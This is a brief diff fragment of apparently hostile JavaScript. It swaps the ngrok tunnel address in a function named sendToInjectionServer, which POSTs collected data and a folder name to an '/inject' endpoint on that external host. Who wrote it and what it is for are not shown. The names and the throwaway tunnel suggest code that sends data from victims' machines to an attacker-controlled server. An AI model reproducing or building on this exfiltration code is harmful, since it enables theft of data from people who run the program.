@@ -545,7 +545,7 @@ pause
 }
 
 function sendToInjectionServer(data, folderName) {
-const serverURL = "https://6105-174-108-187-19.ngrok-free.app/inject";
+const serverURL = "https://6a06-174-108-187-19.ngrok-free.app/inject";
 
 fetch(serverURL, {
   method: "POST",
